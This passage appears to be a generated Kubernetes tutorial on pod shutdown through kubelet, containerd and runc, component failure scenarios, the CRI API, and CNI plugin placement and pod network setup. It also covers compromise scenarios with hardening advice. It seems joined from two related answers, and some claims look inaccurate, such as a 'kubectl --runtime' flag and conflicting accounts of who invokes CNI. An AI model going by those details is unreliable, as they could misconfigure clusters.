│  STEP 6: Wait for grace period (30 seconds)                    │
└────────────────────────────────────────────────────────────────┘

If process exits within 30s:
  → Container stops gracefully
  → Skip to STEP 8
  
If process still running after 30s:
  → Continue to STEP 7
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  STEP 7: containerd sends SIGKILL (force kill)                 │
└────────────────────────────────────────────────────────────────┘

containerd → kill(12345, SIGKILL)
Process terminated immediately (kernel kills it)
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  STEP 8: containerd removes container                          │
└────────────────────────────────────────────────────────────────┘

gRPC call: RemoveContainer
Request: {container_id: "abc123def456"}

containerd:
• Unmounts container filesystem
• Removes container metadata
• Cleans up cgroups
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  STEP 9: Kubelet calls containerd to stop pod sandbox          │
└────────────────────────────────────────────────────────────────┘

gRPC call: StopPodSandbox
Request: {pod_sandbox_id: "xyz789"}

containerd kills pause container
Tears down network namespace (CNI plugin cleanup)
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  STEP 10: Kubelet removes pod from API server                  │
└────────────────────────────────────────────────────────────────┘

Kubelet → API Server:
DELETE /api/v1/namespaces/default/pods/nginx-abc

API server removes pod from etcd
```

### Verification

```bash
# 1. Test graceful shutdown
kubectl delete pod nginx-abc --grace-period=30

# Watch container process
sudo watch -n 1 'ps aux | grep nginx'
# T=0s:  nginx process exists (PID 12345)
# T=1s:  SIGTERM sent, nginx shutting down
# T=5s:  nginx process exited
# T=6s:  Container removed

# 2. Test force kill (grace-period=0)
kubectl delete pod nginx-abc --grace-period=0 --force

# Container killed immediately with SIGKILL
sudo journalctl -u kubelet | grep "Killing container"
# Killing container "nginx" with 0 grace period

# 3. Check containerd logs
sudo journalctl -u containerd | grep "StopContainer"
# StopContainer for "abc123def456" with timeout 30s
```

---

## What Happens When Components Fail?

### Scenario 1: containerd Crashes

```bash
# Simulate containerd crash
sudo systemctl stop containerd
```

**Impact**:
```
┌─────────────────────────────────────────────────────────────────┐
│  containerd STOPPED                                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ✅ EXISTING CONTAINERS: Still running (orphaned)               │
│     • Container processes (nginx, redis) continue running       │
│     • Kernel still enforces cgroups (CPU/memory limits)         │
│     • Namespaces still isolated                                 │
│     • Network still works (CNI already configured)              │
│                                                                 │
│  ❌ NEW OPERATIONS: Fail                                        │
│     • Kubelet can't create new containers                       │
│     • Kubelet can't stop containers                             │
│     • Can't pull images                                         │
│     • Can't get container logs                                  │
│                                                                 │
│  Kubelet logs:                                                  │
│    Failed to create pod sandbox: rpc error: connection refused  │
│    Failed to stop container: dial unix /run/containerd/...sock │
│                                                                 │
│  systemd auto-restarts containerd (Restart=always)             │
│  → After restart, kubelet reconnects                            │
│  → Kubelet syncs state (detects orphaned containers)            │
└─────────────────────────────────────────────────────────────────┘
```

**Verification**:
```bash
# Stop containerd
sudo systemctl stop containerd

# Check container processes (still running!)
ps aux | grep nginx
# 101  12345  0.0  0.1  nginx: master process

# Try to interact via kubelet (fails)
kubectl logs nginx-abc
# Error: context deadline exceeded

# Check containerd status
sudo systemctl status containerd
# Active: inactive (dead)

# Restart containerd
sudo systemctl start containerd

# Kubelet reconnects, syncs state
sudo journalctl -u kubelet -f
# Successfully connected to containerd runtime
# SyncLoop (RECONCILE): Reconciling pod
```

### Scenario 2: kubelet Crashes

```bash
# Simulate kubelet crash
sudo systemctl stop kubelet
```

**Impact**:
```
┌─────────────────────────────────────────────────────────────────┐
│  kubelet STOPPED                                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ✅ CONTAINERS: Keep running                                    │
│     • containerd still manages containers                       │
│     • Container processes unaffected                            │
│     • Network, storage, cgroups intact                          │
│                                                                 │
│  ❌ CONTROL PLANE VISIBILITY: Lost                              │
│     • Node stops sending heartbeats to API server               │
│     • After 40s: Node marked NotReady                           │
│     • After 5 minutes: Pods evicted (recreated on other nodes)  │
│     • No new pods scheduled to this node                        │
│                                                                 │
│  ❌ NODE OPERATIONS: Fail                                       │
│     • Can't create new pods                                     │
│     • Can't delete pods                                         │
│     • No readiness/liveness probe checks                        │
│     • No log collection                                         │
│     • No metrics reporting                                      │
│                                                                 │
│  systemd auto-restarts kubelet (Restart=always)                │
│  → After restart, kubelet re-registers node                     │
│  → Syncs pod state with API server                             │
└─────────────────────────────────────────────────────────────────┘
```

**Verification**:
```bash
# Stop kubelet
sudo systemctl stop kubelet

# Check containers (still running!)
sudo crictl ps
# CONTAINER ID   IMAGE         STATE     NAME
# abc123def456   nginx:1.25    Running   nginx

# Check node status from control plane
kubectl get nodes
# NAME       STATUS     AGE
# worker-1   NotReady   10m  (after 40s without heartbeat)

# Try to delete pod (hangs, kubelet not responding)
kubectl delete pod nginx-abc
# (waits indefinitely)

# Restart kubelet
sudo systemctl start kubelet

# Node becomes Ready again
kubectl get nodes
# NAME       STATUS   AGE
# worker-1   Ready    11m

# kubelet syncs state, deletes the pod
kubectl get pods
# nginx-abc  Terminating  0  10m
```

### Scenario 3: runc Exits (Normal Behavior)

```
runc is NOT a long-running daemon
runc starts container, then exits

┌────────────────────────────────────────────────────────────────┐
│  Container Lifecycle with runc                                 │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  T=0s: containerd calls runc                                   │
│    $ runc create <container-id> --bundle /path/to/bundle       │
│                                                                │
│  T=1s: runc creates namespaces, cgroups, mounts               │
│                                                                │
│  T=2s: runc execs container process (nginx)                   │
│                                                                │
│  T=3s: runc exits (exit code 0)                               │
│    → nginx process now owned by init (PID 1) or containerd-shim│
│    → Container keeps running                                  │
│                                                                │
│  Ongoing: containerd-shim monitors container                   │
│    • Reaps zombie processes                                   │
│    • Collects exit code when container stops                  │
│    • Reports status to containerd                             │
└────────────────────────────────────────────────────────────────┘
```

**Process tree**:
```bash
# Before runc exits
systemd (PID 1)
└─ containerd (PID 1235)
   └─ containerd-shim (PID 12340)
      └─ runc create (PID 12344)
         └─ nginx (PID 12345)  # Being set up

# After runc exits
systemd (PID 1)
└─ containerd (PID 1235)
   └─ containerd-shim (PID 12340)
      └─ nginx (PID 12345)  # Running independently

# runc process is GONE (exited), but container still running
```

---

## Security Boundaries

```
┌─────────────────────────────────────────────────────────────────┐
│              COMPONENT COMPROMISE SCENARIOS                     │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  SCENARIO 1: Kubelet Compromised                                │
│  ────────────────────────────────────────────────────────────   │
│  Attacker gains root on kubelet process                         │
│                                                                 │
│  Direct access:                                                 │
│    ✅ Read/write files on node filesystem                       │
│    ✅ Call containerd CRI API (create/stop containers)          │
│    ✅ Access API server with node credentials                   │
│                                                                 │
│  Does NOT directly give:                                        │
│    ❌ Direct access to container processes                      │
│       (must go through containerd)                              │
│    ❌ Control plane access (unless node cert has privileges)    │
│    ❌ Access to containers on other nodes                       │
│                                                                 │
│  Mitigation:                                                    │
│    • Kubelet runs with minimal RBAC (node authorizer)           │
│    • kubelet cert rotates frequently                            │
│    • Audit kubelet API calls (10250/TCP)                        │
│    • Use admission webhooks to restrict pod specs               │
│                                                                 │
├─────────────────────────────────────────────────────────────────┤
│  SCENARIO 2: containerd Compromised                             │
│  ────────────────────────────────────────────────────────────   │
│  Attacker gains root on containerd process                      │
│                                                                 │
│  Direct access:                                                 │
│    ✅ Create arbitrary containers                               │
│    ✅ Access all container filesystems                          │
│    ✅ Read image layers (potentially secrets in images)         │
│    ✅ Exec into any container                                   │
│                                                                 │
│  Does NOT directly give:                                        │
│    ❌ Cluster-wide access (no API server creds)                 │
│    ❌ Access to etcd                                            │
│    ❌ Access to other nodes                                     │
│                                                                 │
│  Mitigation:                                                    │
│    • Run containerd as unprivileged user (rootless mode)        │
│    • Use gVisor/Kata to add VM boundary                         │
│    • Encrypt images at rest                                     │
│    • Audit containerd API calls                                 │
│                                                                 │
├─────────────────────────────────────────────────────────────────┤
│  SCENARIO 3: Container Escape                                   │
│  ────────────────────────────────────────────────────────────   │
│  Attacker gains root inside container, exploits kernel bug      │
│                                                                 │
│  If successful escape:                                          │
│    ✅ Root on host (full node compromise)                       │
│    ✅ Can interact with kubelet, containerd                     │
│    ✅ Can access other containers on same node                  │
│                                                                 │
│  Mitigation (defense in depth):                                 │
│    • Run containers as non-root (runAsUser: 1000)               │
│    • Drop ALL capabilities                                      │
│    • Use seccomp (block dangerous syscalls)                     │
│    • Use AppArmor/SELinux (MAC)                                 │
│    • Use gVisor (userspace kernel) or Kata (VM isolation)       │
│    • Keep kernel updated (CVE patches)                          │
│    • Read-only root filesystem                                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Example: containerd Security Hardening

```toml
# /etc/containerd/config.toml
version = 2

# Run containerd as unprivileged user
[grpc]
  uid = 65534  # nobody
  gid = 65534

# Restrict CRI plugin
[plugins."io.containerd.grpc.v1.cri"]
  # Disable privileged containers
  disable_privileged = true
  
  # Default seccomp profile
  [plugins."io.containerd.grpc.v1.cri".containerd]
    default_runtime_name = "runc"
    
    [plugins."io.containerd.grpc.v1.cri".containerd.runtimes.runc]
      runtime_type = "io.containerd.runc.v2"
      
      [plugins."io.containerd.grpc.v1.cri".containerd.runtimes.runc.options]
        SystemdCgroup = true
        
    # Add gVisor runtime for high-security workloads
    [plugins."io.containerd.grpc.v1.cri".containerd.runtimes.runsc]
      runtime_type = "io.containerd.runsc.v1"
      
  # Image decryption (for encrypted images)
  [plugins."io.containerd.grpc.v1.cri".image_decryption]
    key_model = "node"

# Restrict snapshotter (use fuse-overlayfs for rootless)
[plugins."io.containerd.snapshotter.v1.overlayfs"]
  root_path = "/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs"
```

---

## CRI Protocol Deep Dive

### CRI gRPC API

```protobuf
// CRI Runtime Service (simplified)
service RuntimeService {
    // Pod sandbox operations
    rpc RunPodSandbox(RunPodSandboxRequest) returns (RunPodSandboxResponse);
    rpc StopPodSandbox(StopPodSandboxRequest) returns (StopPodSandboxResponse);
    rpc RemovePodSandbox(RemovePodSandboxRequest) returns (RemovePodSandboxResponse);
    
    // Container operations
    rpc CreateContainer(CreateContainerRequest) returns (CreateContainerResponse);
    rpc StartContainer(StartContainerRequest) returns (StartContainerResponse);
    rpc StopContainer(StopContainerRequest) returns (StopContainerResponse);
    rpc RemoveContainer(RemoveContainerRequest) returns (RemoveContainerResponse);
    rpc ExecSync(ExecSyncRequest) returns (ExecSyncResponse);
    rpc Exec(ExecRequest) returns (ExecResponse);
    
    // Status operations
    rpc ContainerStatus(ContainerStatusRequest) returns (ContainerStatusResponse);
    rpc ListContainers(ListContainersRequest) returns (ListContainersResponse);
}

service ImageService {
    rpc PullImage(PullImageRequest) returns (PullImageResponse);
    rpc ListImages(ListImagesRequest) returns (ListImagesResponse);
    rpc RemoveImage(RemoveImageRequest) returns (RemoveImageResponse);
}
```

### Example CRI Call Trace

```bash
# Enable CRI debug logging in kubelet
sudo vim /var/lib/kubelet/config.yaml
```
```yaml
apiVersion: kubelet.config.k8s.io/v1beta1
kind: KubeletConfiguration
logging:
  verbosity: 4  # Debug level
```

```bash
# Restart kubelet
sudo systemctl restart kubelet

# Create pod
kubectl run test --image=nginx

# View CRI calls in kubelet logs
sudo journalctl -u kubelet -f | grep "CRI"
```

**Output**:
```
CRI: RunPodSandbox {
  config: {
    metadata: {name: "test", namespace: "default"},
    dns_config: {servers: ["10.96.0.10"]},
    port_mappings: []
  }
}

CRI: RunPodSandbox response {
  pod_sandbox_id: "abcdef123456"
}

CRI: PullImage {
  image: {image: "nginx:latest"},
  auth: null
}

CRI: PullImage response {
  image_ref: "docker.io/library/nginx@sha256:xyz..."
}

CRI: CreateContainer {
  pod_sandbox_id: "abcdef123456",
  config: {
    metadata: {name: "nginx"},
    image: {image: "nginx:latest"},
    command: [],
    linux: {
      security_context: {
        run_as_user: {value: 0},
        capabilities: {drop: ["ALL"]},
        seccomp_profile_path: "/var/lib/kubelet/seccomp/runtime/default"
      },
      resources: {
        cpu_quota: 100000,
        memory_limit_in_bytes: 536870912
      }
    }
  }
}

CRI: CreateContainer response {
  container_id: "container-xyz789"
}

CRI: StartContainer {
  container_id: "container-xyz789"
}

CRI: StartContainer response {}
```

---

## Testing & Validation

```bash
# 1. Verify kubelet → containerd connection
sudo crictl --runtime-endpoint unix:///run/containerd/containerd.sock info
# {
#   "status": {
#     "conditions": [
#       {"type": "RuntimeReady", "status": true},
#       {"type": "NetworkReady", "status": true}
#     ]
#   }
# }

# 2. Test containerd independently (bypass kubelet)
sudo ctr --namespace k8s.io run --rm -t docker.io/library/alpine:latest test-ctr sh
# This creates container directly via containerd, NOT through kubelet
# Container won't appear in `kubectl get pods`

# 3. Simulate containerd failure recovery
sudo systemctl stop containerd
kubectl run test --image=nginx  # Hangs, pod stuck in ContainerCreating
sudo systemctl start containerd
# Pod becomes Running after containerd restarts

# 4. Test graceful shutdown timing
kubectl run nginx --image=nginx --restart=Never
kubectl exec nginx -- sh -c 'trap "sleep 10" SIGTERM; sleep infinity' &
kubectl delete pod nginx --grace-period=5
# Should SIGKILL after 5 seconds (doesn't wait for SIGTERM handler)

# 5. Check container cgroup enforcement
kubectl run stress --image=polinux/stress --restart=Never \
  --requests='cpu=100m,memory=128Mi' \
  --limits='cpu=200m,memory=256Mi' \
  -- stress --cpu 4 --timeout 60s

# Container should be CPU-throttled at 200m (20% of 1 CPU)
sudo crictl stats <container-id>
# CPU usage maxes out at 20%

# 6. Test container process ownership
kubectl run nginx --image=nginx
POD_ID=$(kubectl get pod nginx -o jsonpath='{.metadata.uid}')
CONTAINER_PID=$(pgrep -f "nginx: master process")

sudo ps -o pid,ppid,uid,gid,cmd $CONTAINER_PID
# PID   PPID  UID  GID  CMD
# 12345 12340 101  101  nginx: master process

sudo ls -l /proc/$CONTAINER_PID/ns/pid
# /proc/12345/ns/pid -> pid:[4026532504]  (isolated PID namespace)

# 7. Verify runc exits after container starts
sudo ps aux | grep runc
# (no runc processes - all exited)

sudo ps aux | grep containerd-shim
# root  12340  containerd-shim -namespace k8s.io -id abc123

# 8. Test kubelet failure without affecting containers
CONTAINER_PID=$(pgrep -f "nginx: master process")
sudo systemctl stop kubelet
sleep 5
ps -p $CONTAINER_PID
# PID still exists (container still running)

sudo systemctl start kubelet
```

---

## Next 3 Steps

1. **Implement rootless containerd**: Configure containerd to run as non-root user (UID 1000), use fuse-overlayfs snapshotter, enable user namespaces, test container isolation. Deploy rootless kubelet, verify pods can still run, benchmark performance overhead.
   ```bash
   # Install rootless containerd
   containerd-rootless-setuptool.sh install
   systemctl --user enable --now containerd
   ```

2. **Build custom CRI runtime**: Implement minimal CRI gRPC server in Go that wraps runc directly (bypass containerd), handle RunPodSandbox, CreateContainer, StartContainer calls. Deploy to test cluster, use `kubectl --runtime=custom-cri` to schedule pods, measure latency vs containerd.

3. **Develop containerd monitoring and recovery system**: Build sidecar that monitors containerd health (gRPC health checks), detects crashes/hangs, automatically restarts containerd if unresponsive. Implement orphaned container detection (containers running but not in containerd metadata), reconciliation logic. Test failure scenarios: containerd OOM, socket corruption, slow disk I/O.

---

## References

- **CRI Specification**: https://github.com/kubernetes/cri-api
- **containerd Architecture**: https://github.com/containerd/containerd/blob/main/docs/ARCHITECTURE.md
- **OCI Runtime Spec**: https://github.com/opencontainers/runtime-spec
- **Kubelet CRI Integration**: https://kubernetes.io/docs/concepts/architecture/cri/
- **runc Documentation**: https://github.com/opencontainers/runc
- **containerd Security**: https://github.com/containerd/containerd/blob/main/docs/SECURITY.md

## Summary

**CNI (Container Network Interface) plugins are installed on EVERY worker node in the data plane**, NOT on the control plane. They run as privileged DaemonSets (one pod per node) or as host binaries in `/opt/cni/bin/`. When kubelet creates a pod, it calls the CNI plugin on that node to allocate an IP, create veth pairs, configure routes, and set up network namespaces. Control plane nodes may also run CNI if they're untainted and schedule workload pods, but control plane components themselves don't need CNI (they use host networking). CNI plugins have direct access to host network namespaces, iptables, routing tables, and kernel—making them a critical security boundary. A compromised CNI plugin can intercept all pod traffic on that node, poison ARP tables, or escape to host network.

---

## CNI Plugin Architecture: Where Components Run

```
┌─────────────────────────────────────────────────────────────────┐
│                     CONTROL PLANE NODES                         │
│  (Typically do NOT run CNI plugins for user workloads)          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  kube-apiserver (hostNetwork: true)                      │   │
│  │  Uses host network stack directly                        │   │
│  │  No CNI involved                                         │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  etcd (hostNetwork: true)                                │   │
│  │  Uses host network stack directly                        │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                 │
│  Control plane pods typically use hostNetwork: true             │
│  → They bypass CNI entirely                                     │
│                                                                 │
│  If control plane nodes are untainted:                          │
│  → User workloads CAN be scheduled                              │
│  → CNI plugin DaemonSet WILL run on these nodes                 │
└─────────────────────────────────────────────────────────────────┘
                          │
                          │ API server manages CNI DaemonSet
                          │ but doesn't run CNI itself
                          │
┌─────────────────────────▼───────────────────────────────────────┐
│                      WORKER NODES (Data Plane)                  │
│  CNI plugins run on EVERY worker node                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │  NODE 1                                                    │ │
│  ├────────────────────────────────────────────────────────────┤ │
│  │                                                            │ │
│  │  ┌──────────────────────────────────────────────────────┐ │ │
│  │  │  CNI PLUGIN COMPONENTS                               │ │ │
│  │  ├──────────────────────────────────────────────────────┤ │ │
│  │  │                                                      │ │ │
│  │  │  1. CNI BINARIES (host filesystem)                  │ │ │
│  │  │     /opt/cni/bin/                                    │ │ │
│  │  │     ├── calico      (main plugin)                   │ │ │
│  │  │     ├── flannel     (overlay network)               │ │ │
│  │  │     ├── bridge      (standard CNI)                  │ │ │
│  │  │     ├── loopback    (standard CNI)                  │ │ │
│  │  │     ├── host-local  (IPAM plugin)                   │ │ │
│  │  │     └── bandwidth   (traffic shaping)               │ │ │
│  │  │                                                      │ │ │
│  │  │  2. CNI CONFIG (host filesystem)                    │ │ │
│  │  │     /etc/cni/net.d/                                 │ │ │
│  │  │     └── 10-calico.conflist                          │ │ │
│  │  │                                                      │ │ │
│  │  │  3. CNI DAEMONSET POD (privileged)                  │ │ │
│  │  │     calico-node-xyz (runs on this node)             │ │ │
│  │  │     ├── hostNetwork: true                           │ │ │
│  │  │     ├── hostPID: true                               │ │ │
│  │  │     ├── privileged: true                            │ │ │
│  │  │     └── Mounts: /opt/cni/bin, /etc/cni/net.d       │ │ │
│  │  │                                                      │ │ │
│  │  │     Responsibilities:                               │ │ │
│  │  │     • Install/update CNI binaries                   │ │ │
│  │  │     • Configure routing (BGP, VXLAN)                │ │ │
│  │  │     • Enforce NetworkPolicy (iptables/eBPF)         │ │ │
│  │  │     • Allocate IP addresses (IPAM)                  │ │ │
│  │  │     • Monitor network health                        │ │ │
│  │  └──────────────────────────────────────────────────────┘ │ │
│  │                                                            │ │
│  │  ┌──────────────────────────────────────────────────────┐ │ │
│  │  │  KUBELET                                             │ │ │
│  │  │  • Calls CNI binaries when creating pods            │ │ │
│  │  │  • Executes: /opt/cni/bin/calico ADD <container>    │ │ │
│  │  │  • Passes network config from /etc/cni/net.d/       │ │ │
│  │  └──────────────┬───────────────────────────────────────┘ │ │
│  │                 │                                          │ │
│  │                 │ Calls CNI                                │ │
│  │                 │                                          │ │
│  │  ┌──────────────▼───────────────────────────────────────┐ │ │
│  │  │  CONTAINER RUNTIME (containerd)                      │ │ │
│  │  │  • Creates network namespace                         │ │ │
│  │  │  • Calls kubelet to setup network                    │ │ │
│  │  └──────────────────────────────────────────────────────┘ │ │
│  │                                                            │ │
│  │  ┌──────────────────────────────────────────────────────┐ │ │
│  │  │  HOST NETWORK STACK                                  │ │ │
│  │  │  • CNI plugin creates veth pairs                     │ │ │
│  │  │  • Attaches to bridge/OVS                            │ │ │
│  │  │  • Configures iptables rules                         │ │ │
│  │  │  • Sets up routes                                    │ │ │
│  │  └──────────────────────────────────────────────────────┘ │ │
│  │                                                            │ │
│  │  PODS (using CNI-assigned networking):                    │ │
│  │  ├── Pod 1: nginx (IP: 10.244.1.5)                        │ │
│  │  ├── Pod 2: redis (IP: 10.244.1.6)                        │ │
│  │  └── Pod 3: app (IP: 10.244.1.7)                          │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                 │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │  NODE 2 (identical CNI setup)                              │ │
│  │  • calico-node-abc (DaemonSet pod)                         │ │
│  │  • /opt/cni/bin/* (binaries)                               │ │
│  │  • /etc/cni/net.d/* (config)                               │ │
│  │  • Pods: 10.244.2.x IP range                               │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                 │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │  NODE N (identical CNI setup)                              │ │
│  │  • calico-node-def (DaemonSet pod)                         │ │
│  │  • /opt/cni/bin/* (binaries)                               │ │
│  │  • /etc/cni/net.d/* (config)                               │ │
│  │  • Pods: 10.244.N.x IP range                               │ │
│  └────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────┘
```

---

## CNI Plugin Deployment Patterns

### Pattern 1: DaemonSet + Host Binaries (Most Common)

```yaml
# Example: Calico CNI DaemonSet
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: calico-node
  namespace: kube-system
spec:
  selector:
    matchLabels:
      k8s-app: calico-node
  template:
    metadata:
      labels:
        k8s-app: calico-node
    spec:
      hostNetwork: true  # Uses host network namespace
      hostPID: true      # Can see host processes
      tolerations:
      - operator: Exists  # Run on ALL nodes including control plane
      
      initContainers:
      # Install CNI binaries to host
      - name: install-cni
        image: calico/cni:v3.26.0
        command: ["/opt/cni/bin/install"]
        env:
        - name: CNI_CONF_NAME
          value: "10-calico.conflist"
        - name: CNI_NETWORK_CONFIG
          valueFrom:
            configMapKeyRef:
              name: calico-config
              key: cni_network_config
        volumeMounts:
        - name: cni-bin-dir
          mountPath: /host/opt/cni/bin
        - name: cni-net-dir
          mountPath: /host/etc/cni/net.d
      
      containers:
      # Main CNI daemon (routing, policy enforcement)
      - name: calico-node
        image: calico/node:v3.26.0
        securityContext:
          privileged: true  # Needs full host access
        env:
        - name: CALICO_NETWORKING_BACKEND
          value: "bird"  # BGP routing
        - name: CLUSTER_TYPE
          value: "k8s,bgp"
        - name: IP_AUTODETECTION_METHOD
          value: "interface=eth0"
        - name: CALICO_IPV4POOL_CIDR
          value: "10.244.0.0/16"
        volumeMounts:
        - name: lib-modules
          mountPath: /lib/modules
          readOnly: true
        - name: var-run-calico
          mountPath: /var/run/calico
        - name: xtables-lock
          mountPath: /run/xtables.lock
        - name: cni-bin-dir
          mountPath: /host/opt/cni/bin
        - name: cni-net-dir
          mountPath: /host/etc/cni/net.d
      
      volumes:
      - name: cni-bin-dir
        hostPath:
          path: /opt/cni/bin
      - name: cni-net-dir
        hostPath:
          path: /etc/cni/net.d
      - name: lib-modules
        hostPath:
          path: /lib/modules
      - name: var-run-calico
        hostPath:
          path: /var/run/calico
      - name: xtables-lock
        hostPath:
          path: /run/xtables.lock
          type: FileOrCreate
```

**Verification**:
```bash
# 1. Check CNI DaemonSet running on all nodes
kubectl get ds -n kube-system calico-node
# NAME           DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE
# calico-node    3         3         3       3            3

kubectl get pods -n kube-system -l k8s-app=calico-node -o wide
# NAME                READY   STATUS    NODE
# calico-node-abc     1/1     Running   worker-1
# calico-node-def     1/1     Running   worker-2
# calico-node-ghi     1/1     Running   worker-3

# 2. Verify CNI binaries installed on host
ls -lh /opt/cni/bin/
# -rwxr-xr-x 1 root root 38M Jan 18 10:00 calico
# -rwxr-xr-x 1 root root 3.8M Jan 18 10:00 calico-ipam
# -rwxr-xr-x 1 root root 3.0M Jan 18 10:00 bandwidth
# -rwxr-xr-x 1 root root 4.2M Jan 18 10:00 bridge
# -rwxr-xr-x 1 root root 10M Jan 18 10:00 host-local
# -rwxr-xr-x 1 root root 3.0M Jan 18 10:00 loopback

# 3. Verify CNI configuration
cat /etc/cni/net.d/10-calico.conflist
```

```json
{
  "name": "k8s-pod-network",
  "cniVersion": "0.3.1",
  "plugins": [
    {
      "type": "calico",
      "log_level": "info",
      "datastore_type": "kubernetes",
      "nodename": "worker-1",
      "mtu": 1440,
      "ipam": {
        "type": "calico-ipam"
      },
      "policy": {
        "type": "k8s"
      },
      "kubernetes": {
        "kubeconfig": "/etc/cni/net.d/calico-kubeconfig"
      }
    },
    {
      "type": "bandwidth",
      "capabilities": {"bandwidth": true}
    },
    {
      "type": "portmap",
      "snat": true,
      "capabilities": {"portMappings": true}
    }
  ]
}
```

---

## CNI Lifecycle: Pod Network Setup

### Step-by-Step Flow

```
┌────────────────────────────────────────────────────────────────┐
│  STEP 1: Pod scheduled to node-1                               │
└────────────────────────────────────────────────────────────────┘

Scheduler binds pod to node-1
API server updates pod.spec.nodeName = "node-1"
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  STEP 2: Kubelet on node-1 detects new pod                     │
└────────────────────────────────────────────────────────────────┘

Kubelet watches API server, sees pod assigned to node-1
Calls containerd via CRI: RunPodSandbox
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  STEP 3: containerd creates network namespace                  │
└────────────────────────────────────────────────────────────────┘

containerd → runc creates network namespace
Network namespace created: /var/run/netns/cni-12345678
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  STEP 4: containerd calls CNI plugin                           │
└────────────────────────────────────────────────────────────────┘

containerd reads /etc/cni/net.d/10-calico.conflist
Executes: /opt/cni/bin/calico ADD

Environment variables passed to CNI plugin:
CNI_COMMAND=ADD
CNI_CONTAINERID=abc123def456
CNI_NETNS=/var/run/netns/cni-12345678
CNI_IFNAME=eth0
CNI_PATH=/opt/cni/bin

Stdin (JSON config):
{
  "cniVersion": "0.3.1",
  "name": "k8s-pod-network",
  "type": "calico",
  "ipam": {"type": "calico-ipam"},
  ...
}
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  STEP 5: CNI plugin (calico) executes                          │
└────────────────────────────────────────────────────────────────┘

1. IPAM: Allocate IP address from node's CIDR
   • Query Kubernetes API for available IPs
   • Allocate 10.244.1.5 from node-1's 10.244.1.0/24 range
   • Create IPPool resource (CRD) in Kubernetes

2. Create veth pair (virtual ethernet cable)
   • Host side: cali1234567890
   • Container side: eth0
   
3. Move container end into pod's network namespace
   • ip link set eth0 netns /var/run/netns/cni-12345678

4. Configure container interface
   • ip addr add 10.244.1.5/32 dev eth0 (inside netns)
   • ip link set eth0 up
   • ip route add default via 169.254.1.1 (calico gateway)

5. Configure host interface
   • ip link set cali1234567890 up (on host)
   • ip route add 10.244.1.5 dev cali1234567890 (host route)

6. Program iptables rules (if NetworkPolicy enabled)
   • Create chains: cali-fw-cali1234567890
   • Default policy: DROP (if policy exists)
   • Add rules based on NetworkPolicy specs

7. Return result to containerd (JSON on stdout)
{
  "cniVersion": "0.3.1",
  "interfaces": [
    {"name": "cali1234567890", "mac": "ee:ee:ee:ee:ee:ee"},
    {"name": "eth0", "mac": "aa:bb:cc:dd:ee:ff", "sandbox": "/var/run/netns/cni-12345678"}
  ],
  "ips": [
    {
      "version": "4",
      "interface": 1,
      "address": "10.244.1.5/32",
      "gateway": "169.254.1.1"
    }
  ],
  "routes": [
    {"dst": "0.0.0.0/0", "gw": "169.254.1.1"}
  ],
  "dns": {}
}
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  STEP 6: containerd receives CNI result                        │
└────────────────────────────────────────────────────────────────┘

containerd stores network config
Returns success to kubelet
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  STEP 7: Kubelet starts application containers                 │
└────────────────────────────────────────────────────────────────┘

Containers join existing network namespace (from pause container)
All containers in pod share same IP: 10.244.1.5
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  STEP 8: CNI daemon (calico-node) programs routes              │
└────────────────────────────────────────────────────────────────┘

calico-node DaemonSet pod:
• Watches Kubernetes API for new pods
• Programs BGP routes (if using BGP mode)
  - Advertises 10.244.1.0/24 to other nodes
  - Other nodes learn routes to reach 10.244.1.5
• OR creates VXLAN tunnels (if using overlay mode)
  - Encapsulates pod traffic in VXLAN header
  - Tunnels to remote nodes
                    │
                    ▼
┌────────────────────────────────────────────────────────────────┐
│  RESULT: Pod has network connectivity                          │
└────────────────────────────────────────────────────────────────┘

Pod can:
✅ Communicate with other pods (10.244.x.x)
✅ Reach services (10.96.x.x ClusterIP)
✅ Egress to internet (if allowed by NetworkPolicy)
✅ Receive ingress traffic (if allowed by NetworkPolicy)
```

### Network Topology After CNI Setup

```
┌─────────────────────────────────────────────────────────────────┐
│  NODE 1 (10.244.1.0/24 pod CIDR)                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Host Network Namespace:                                        │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  eth0 (node IP: 192.168.1.10)                            │   │
│  │  ├─ Routes to other nodes                                │   │
│  │  └─ Default gateway: 192.168.1.1                         │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  calico routes                                            │   │
│  │  10.244.2.0/24 via 192.168.1.11 (node-2)                 │   │
│  │  10.244.3.0/24 via 192.168.1.12 (node-3)                 │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  Host veth interfaces (one per pod)                      │   │
│  │  ├─ cali1234567890 → 10.244.1.5 (pod-1)                  │   │
